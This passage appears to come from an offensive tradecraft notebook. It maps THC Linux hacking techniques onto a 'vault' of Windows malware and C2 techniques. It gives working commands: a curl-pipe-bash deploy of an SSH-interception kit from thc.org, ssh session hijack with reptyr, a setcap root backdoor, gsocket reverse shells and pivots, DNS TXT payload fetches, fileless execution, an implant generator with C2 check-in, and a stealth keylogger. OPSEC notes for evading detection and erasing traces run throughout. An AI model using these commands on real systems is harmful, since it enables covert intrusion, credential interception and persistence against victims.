- **OPSEC**: The `#0xFD0E` sentinel is discoverable by grepping `~/.profile` for hex markers — rotate per engagement.

### Session Sniffing — SSH-IT (Automated)

- **What**: THC's automated SSH-interception toolkit — handles deploy/persistence/log-collection.
- **When to use**: Want the wrapper-script attack without manual setup.
- **How**: `bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"`.
- **Vault link**: Equivalent to vault's `browser_hook.rs` (T-023) auto-deploy pattern — both stage an interception layer with one command.
- **Tool/code**: `ssh-it` from THC.
- **OPSEC**: Pull-from-network deploy pattern is high-noise on first run; stage locally for follow-on engagements.

### Session Hijack — reptyr

- **What**: Take over an existing SSH session via ptrace.
- **When to use**: Want to inherit a user's authenticated session without re-authenticating.
- **How**: `ps ax -o pid,ppid,cmd | grep 'ssh '`, then `./reptyr -T <SSH PID>`. Must use `-T` or the original user sees their SSH process suspended.
- **Vault link**: **T-013 Remaining Injection / Thread Hijack** — vault's `waiting_thread.rs` is the Windows thread-hijack analog. Same concept: attach to a live process, redirect its execution flow.
- **Tool/code**: `repyr -T` from `github.com/nelhage/reptyr`.
- **OPSEC**: Requires `ptrace_scope=0` or root. Detectable via audit-log `PTRACE_ATTACH` events.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `gsocket.io/y` `gsocket.io/ys` | gsocket deploy one-liners | `/ys` self-hosts deploy + emits results.log |
| `sshx.io` | Browser-access reverse shell | Third-party infra; rotate for long-dwell |
| `gs-netcat -l -S` / `-p 1080` | SOCKS pivot via relay network | Relay IPs in threat-intel feeds |
| `setcap cap_setuid+ep /lib64/ld-*.so.*` | Persistent local-root backdoor | Detectable by `getcap -r /` |
| `mkegg.sh` | Self-extracting implant generator | Bundle webhook callback for C2 check-in |
| `memexec` Perl one-liner | memfd_create fileless ELF exec | `/proc/<pid>/maps` shows `/memfd:` |
| `noseyparker` (static binary) | Secret scanning in repos/files | Drop the static-x86_64 binary from THC mirror |
| `trufflehog` | Secret scanning | Larger footprint than noseyparker |
| `PassDetective` | Passwords in `~/.*history` | History-file-only — limited |
| `Chrome-ABE` | Chrome App-Bound Encryption decryption | Windows-only; extracts from running Chrome |
| `whatserver.sh` (`thc.org/ws`) | Host enumeration one-liner | Network pull — stage locally for OPSEC |
| `awk_netstat.sh` | Netstat replacement via awk | Pure-awk, no deps |
| `bench.sh` / `yabs.sh` | CPU/IO benchmarking | Useful for VM-detection |
| `cryptsetup luksFormat` | Transportable encrypted filesystem | LUKS header is detectable via entropy scan |
| `encfs --standard` | Stacked-encrypted directory | EncFS is deprecated; prefer gocryptfs |
| `openssl enc -aes-256-cbc -pbkdf2` | File encryption | No auth — prefer GCM (vault T-021) |
| `upx -qqq` + Perl cleansers | ELF pack + header scrub | `upx -d` should fail post-cleanse |
| `bincrypter` | ELF encryption layer | THC tool; pairs with UPX-cleanse |
| `script -fqaec -I <logfile>` | Bash session keystroke logger | Needs util-linux ≥ 2.37 (`-I` flag) |
| `zapper` (THC) | argv-hider for Linux processes | Pairs with `script` for stealthy logger |
| `dtrace -sd` (D script) | FreeBSD/Solaris sshd write sniff | Requires `dtrace_kernel` priv |
| `bpftrace` + `ptysnoop.bt` | eBPF PTY/keystroke sniff | Requires `CAP_BPF`; blocked if `unprivileged_bpf_disabled=1` |
| `strace -e trace=read/write -p` | ptrace-based session sniff | Fails if `yama/ptrace_scope=1` |
| `~/.local/bin/ssh` wrapper | PATH-hijack SSH strace | `#0xFD0E` sentinel discoverable |
| `ssh-it` (`thc.org/ssh-it/x`) | Automated SSH interception | One-shot deploy from network |
| `reptyr -T <pid>` | SSH session takeover | `-T` critical; ptrace_scope restrictions apply |
| `touch -r <ref> <target>` | mtime restoration | Doesn't fix ctime — use `hackshell` `ctime` |
| `mount -o bind,ro` | Read-only file substitution | Survives `find -newer`; not `/proc/mounts` |
| `/dev/shm` | Volatile working directory | Lost on reboot — "NO LOGZ == NO CRIME" |
| `dig +short <dom> TXT` | DNS TXT payload fetch | Logged by PassiveDNS |
| `dns_get_record(... DNS_TXT)` (PHP) | DNS TXT payload fetch (webshell) | Same DNS-log exposure |

## Gaps & Extensions

**Training covers; vault does not:**
- **Linux/Unix tradecraft writ large.** The vault is Windows-only across all 23 cards. THC material covers SSHD backdoors, ld-linux setcap, `/dev/shm` OPSEC, `mount -o bind,ro` substitution, DTrace/eBPF/strace sniffing, PATH-hijack wrapper attacks. None of these have vault equivalents. **Recommended port into vault:** a new card `T-024 Linux Persistence & Sniffing Suite` consolidating sshd-backdoor, setcap-on-ld, `script`-logger, eBPF sniff, and PATH-hijack patterns.
- **Reverse DNS TXT-tunnel.** Lightweight autonomous C2 that's far simpler to deploy than Edo Dead Drop's blockchain approach. 
- **`memexec` Perl one-liner.** Single-shot fileless ELF exec via memfd_create — strictly simpler than vault's mapping injection on Windows. Worth porting the *concept* (syscall-number-agnostic memfd_create loop) into vault's `pe_loader.rs` for cross-platform builds.
- **UPX-cleansing pipeline.** Post-build binary scrubbing is absent from the vault; vault relies entirely on compile-time obfuscation (proc macro). Useful for engagements where the operator must use a pre-built binary. 
- **`mount -o bind,ro` file substitution.** The Unix analog of module stomping — worth documenting in T-016/T-009 as the cross-platform counterpart.
- **`reptyr -T` session takeover.** Live session hijack via ptrace; the Windows equivalent (thread hijack on a live process) is in T-013 but vault's impl focuses on suspended processes.

**Vault covers; training does not:**
- **Indirect syscall dispatch** (T-001 RecycledGate, T-002 Hell's/Halo's/Tartarus, T-003 VEH Gate) — THC doesn't address Windows syscalls at all.
- **Sleep obfuscation** (T-005 Ekko ROP) — no Linux equivalent in THC material.
- **EDR unhooking / AMSI patching / ETW muffling** (T-016) — Unix doesn't have EDR/AMSI/ETW; the closest THC gets is eBPF for *attacker-side* telemetry.
- **Reflective PE loading, process hollowing, ghosting, herpaderping** (T-007/T-009/T-010) — Windows-specific; THC's memfd_create is the only Unix analog and is much simpler.
- **BYOVD** (T-018) — kernel-driver attack surface doesn't exist on Linux in the same form.
- **Multi-chain vault / malleable C2 / HTTP-poll transport / VNC** (T-022) — THC has gsocket but nothing comparable to vault's malleable profile engine or HVNC.
- **Browser hooking / WebView2 phishing / Win32 overlay** (T-023) — Windows-only client capabilities.
- **Crypto & Obfuscation crate** (T-021) — vault uses AES-256-GCM + zstd; THC uses CBC unauthenticated. Vault is strictly superior; THC's LUKS filesystem recipe has no vault analog.

**Knowledge gaps in training material:**
- THC's `aes-256-cbc` recipe is outdated — should be replaced with `aes-256-gcm` even in THC's own snippets (e.g. `openssl enc -aes-256-gcm`).
- `encfs` is deprecated upstream; should switch to `gocryptfs` or `cryfs`.
- UPX-cleansing doesn't address entropy — packed sections still flag in static analysis even with `UPX!` zeroed. Should add an `upx -d` post-check + entropy audit.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| gsocket SOCKS pivot (`gs-netcat -l -S`) | T-022 Network Suite / Kamui | Conceptual sibling — Kamui is the bespoke C2-embedded SOCKS5; gsocket uses the Global Socket Relay Network for NAT-traversal |
| SSHD `AuthorizedKeysFile` host-key backdoor | T-017 Five-Layer Persistence | Unix equivalent of a low-noise persistence layer — same idea (config directive abuse), different OS |
| Reverse DNS TXT-tunnel backdoor | T-019 Edo Dead Drop | Same dead-drop pattern (carrier channel + base64 payload), different medium (DNS vs blockchain/Google Translate) |
| `mkegg.sh` self-extracting implant | T-022 Architecture / `runner.rs` + `transport.rs` | Same dropper/loader pattern; vault uses multi-phase runner, THC uses tarball-in-bash |
| `memexec` Perl memfd_create one-liner | T-007 Process Injection / Mapping Inject + T-013 PE Loader | Linux equivalent of fileless PE execution; strictly simpler (no `NtMapViewOfSection` dance) |
| `whatserver.sh` + `awk_netstat.sh` + `find -perm /6000` | T-023 Byakugan | Unix equivalent of vault's Windows recon module |
| `touch -r` mtime restoration | T-020 Anti-Analysis Suite / Self-Delete | Same anti-forensics goal; vault uses ADS rename on Windows, THC uses `touch`/`mount -o bind` on Unix |
| `mount -o bind,ro` file substitution | T-016 Module Stomping + T-009 PE Stomping | Cross-platform analog — substitute file content while inode appears unmodified |
| UPX + Perl header-cleansing | T-021 Crypto & Obfuscation (proc macro) + T-020 IAT Camouflage | Same obfuscation goal; vault bakes in at compile time, THC patches post-build |
| `aes-256-cbc` + `cryptsetup luksFormat` | T-021 Crypto (`crypto.rs` AES-256-GCM+zstd) | Vault is strictly superior (authenticated + compressed); THC's LUKS filesystem has no vault analog |
| `script`+`exec -a "sshd: pts/0"` bash logger | T-023 Keylogger (`keylogger.rs`) + T-016 Arg Spoof | Unix equivalent of keystroke logging + argv masquerade |
| DTrace/eBPF/strace kernel sniffing | T-016 ETW muffling | Conceptually opposite — vault *disables* kernel telemetry to evade defenders; THC *enables* kernel telemetry for attacker surveillance |
| `~/.local/bin/ssh` PATH-hijack wrapper | T-016 Proxy DLL | Cross-platform analog — interpose a malicious shim with same exports |
| `reptyr -T` session takeover | T-013 Thread Hijack / WaitingThread | Live-session hijack via ptrace (Unix) vs suspended-process thread hijack (Windows) |
| `setcap cap_setuid+ep /lib64/ld-linux.so` | T-017 UAC Bypass (`uac_cmstp.rs` / slui.exe registry) | Local-priv-escalation persistence layer; platform-specific analogs |
| gsocket deploy one-liner via `curl|bash` | T-023 Client Capabilities / browser hook auto-deploy | Same one-shot deploy pattern, different surfaces |
| `/dev/shm`-only working dir | T-020 Self-Delete (ADS rename) | Same "leave no trace" goal; THC uses RAM-only tmpfs, vault uses ADS rename on Windows |
